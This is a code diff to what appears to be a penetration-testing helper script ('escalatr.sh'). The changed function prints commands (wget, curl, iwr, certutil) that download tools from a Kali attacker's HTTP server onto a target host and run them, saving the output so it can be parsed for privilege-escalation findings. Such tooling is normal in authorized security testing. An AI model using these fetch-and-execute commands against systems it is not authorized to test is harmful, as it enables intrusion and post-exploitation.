@@ -287,21 +287,34 @@ serve_tools() {
     for f in "$tools_dir"/*; do
         fname=$(basename "$f")
         if [[ "$fname" == *.sh ]]; then
-            echo -e "  ${CYAN}# Linux: wget or curl${NC}"
+            local base="${fname%.sh}"
+            echo -e "  ${CYAN}# Linux: download${NC}"
             echo -e "  wget http://${kali_ip}:${HTTP_PORT}/${fname} -O ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
             echo -e "  curl http://${kali_ip}:${HTTP_PORT}/${fname} -o ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
+            echo -e "  ${CYAN}# Run (saves output for parsing):${NC}"
+            echo -e "  ${REMOTE_TMP}/${fname} | tee ${REMOTE_TMP}/${base}_output.txt"
         elif [[ "$fname" == *.zip ]]; then
             echo -e "  ${CYAN}# Windows: download + unzip${NC}"
             echo -e "  iwr -uri http://${kali_ip}:${HTTP_PORT}/${fname} -Outfile C:\\Users\\Public\\${fname}"
             echo -e "  Expand-Archive -Path C:\\Users\\Public\\${fname} -DestinationPath C:\\Users\\Public\\ -Force"
-        elif [[ "$fname" == *.exe ]] || [[ "$fname" == *.ps1 ]]; then
-            echo -e "  ${CYAN}# Windows: iwr or certutil${NC}"
+        elif [[ "$fname" == *.exe ]]; then
+            local base="${fname%.exe}"
+            echo -e "  ${CYAN}# Windows: download${NC}"
+            echo -e "  iwr -uri http://${kali_ip}:${HTTP_PORT}/${fname} -Outfile C:\\Users\\Public\\${fname}"
+            echo -e "  certutil -urlcache -split -f http://${kali_ip}:${HTTP_PORT}/${fname} C:\\Users\\Public\\${fname}"
+            echo -e "  ${CYAN}# Run (saves output for parsing):${NC}"
+            echo -e "  .\\${fname} > C:\\Users\\Public\\${base}_output.txt"
+        elif [[ "$fname" == *.ps1 ]]; then
+            echo -e "  ${CYAN}# Windows: download${NC}"
             echo -e "  iwr -uri http://${kali_ip}:${HTTP_PORT}/${fname} -Outfile C:\\Users\\Public\\${fname}"
             echo -e "  certutil -urlcache -split -f http://${kali_ip}:${HTTP_PORT}/${fname} C:\\Users\\Public\\${fname}"
         else
+            local base="${fname%.*}"
             echo -e "  ${CYAN}# Transfer: ${fname}${NC}"
             echo -e "  wget http://${kali_ip}:${HTTP_PORT}/${fname} -O ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
             echo -e "  curl http://${kali_ip}:${HTTP_PORT}/${fname} -o ${REMOTE_TMP}/${fname} && chmod +x ${REMOTE_TMP}/${fname}"
+            echo -e "  ${CYAN}# Run (saves output for parsing):${NC}"
+            echo -e "  ${REMOTE_TMP}/${fname} | tee ${REMOTE_TMP}/${base}_output.txt"
         fi
         echo ""
     done
@@ -1366,7 +1379,7 @@ main() {
     info "Next steps:"
     echo -e "  1. Transfer tools to target using commands above"
     echo -e "  2. Run enumeration commands from ${BOLD}$target_dir/commands.txt${NC}"
-    echo -e "  3. Save tool output, then parse: ${BOLD}./escalatr.sh --parse <output_file>${NC}"
+    echo -e "  3. Transfer output file to Kali, then parse: ${BOLD}./escalatr.sh --parse <output_file>${NC}"
     echo -e "  4. Check quick-wins report for prioritized findings"
     echo ""
 
